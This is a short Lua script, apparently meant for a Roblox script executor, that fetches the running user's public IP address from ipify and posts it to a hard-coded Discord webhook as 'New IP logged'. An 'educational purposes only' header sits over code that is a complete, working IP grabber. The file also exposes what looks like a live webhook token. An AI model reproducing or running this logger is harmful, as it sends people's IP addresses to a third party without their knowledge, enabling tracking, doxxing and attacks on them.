-- WARNING: FOR EDUCATIONAL PURPOSES ONLY. DO NOT MISUSE.
local webhookURL = "https://discord.com/api/webhooks/1363242998279704617/Ra_tfgVJmBtBB_HlnmvwdhwZsxaElYjzdqX-0o2A8ozCTStjbdaPCZXcHTU889vrs3Tg" -- Replace with your test webhook

-- Function to fetch the IP
local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org") -- External IP service
    end)
    return success and result or "Failed to fetch IP"
end

-- Function to send data to webhook
local function sendToWebhook(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    local payload = {
        content = ("New IP logged: `%s`"):format(data)
    }

    local success, response = pcall(function()
        return request({
            Url = webhookURL,
            Method = "POST",
            Headers = headers,
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)
    
    if not success then
        warn("Webhook error: " .. tostring(response))
    end
end

-- Execute
sendToWebhook(getIP())
